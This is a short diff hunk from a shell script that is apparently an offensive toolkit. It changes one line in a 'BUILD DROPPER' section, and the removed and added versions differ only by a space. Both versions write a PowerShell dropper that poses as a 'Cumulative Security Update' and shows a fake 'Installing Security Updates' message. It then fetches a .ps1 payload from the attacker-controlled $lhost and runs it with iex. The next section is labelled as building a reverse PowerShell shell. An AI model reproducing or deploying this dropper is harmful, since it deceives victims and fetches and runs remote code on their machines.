@@ -12037,7 +12037,7 @@ echo "---"
 ## BUILD DROPPER
 # New update to dropper: add PS terminal title and msg ..
 echo "${BlueF}[☠]${white} Building Obfuscated ps1 dropper ..${white}";sleep 2
-echo "\$host.UI.RawUI.WindowTitle = \"Cumulative Security Update ID00788\"; Write-Host \"Please Wait, Installing Security Updates ..\" -ForeGroundColor green -BackGroundColor black;\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1
+echo "\$host.UI.RawUI.WindowTitle = \"Cumulative Security Update ID00788\";Write-Host \"Please Wait, Installing Security Updates ..\" -ForeGroundColor green -BackGroundColor black;\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1
 
 
 ## Build Reverse Powershell Shell
